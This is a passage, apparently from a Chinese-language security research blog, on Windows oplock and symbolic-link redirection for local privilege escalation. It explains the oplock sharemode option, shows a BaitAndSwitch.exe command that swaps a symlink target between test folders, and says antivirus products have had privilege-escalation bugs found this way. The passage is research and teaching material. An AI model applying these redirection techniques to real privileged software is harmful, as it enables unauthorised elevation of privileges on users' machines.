`[sharemode]`：这是一个可选参数，定义哪种类型的共享访问会触发oplock处理。可以指定 r（读取），w（写入），d（删除），或这些的组合。如果不指定任何模式，则文件将以独占访问方式打开。这个参数影响的是其他应用程序打开文件时允许的共享模式，而不是文件访问类型。

目录下创建：`symlink`目录和`test2`目录（注意不要创建`test1`目录）

```php
BaitAndSwitch.exe C:\Users\root\Desktop\test01\BaitAndSwitch\test1\symlink C:\Users\root\Desktop\test01\BaitAndSwitch\test1 C:\Users\root\Desktop\test01\BaitAndSwitch\test2
```

执行效果：

![](images/1715653848573-0ad767be-3f88-46ca-b246-d6ab37012ea6.png)

![](images/1715654808172-5b6e8bee-f2b8-43f3-8f55-5ab33039da5d.png)

总结
==

目前，上述利用手法大部分出现在杀软上，例如赛门铁克、迈克菲、Windows Defender等等知名软件都被挖掘出若干使用该手法进行利用的本地提权漏洞。后续我将针对最新的漏洞进行具体分析。
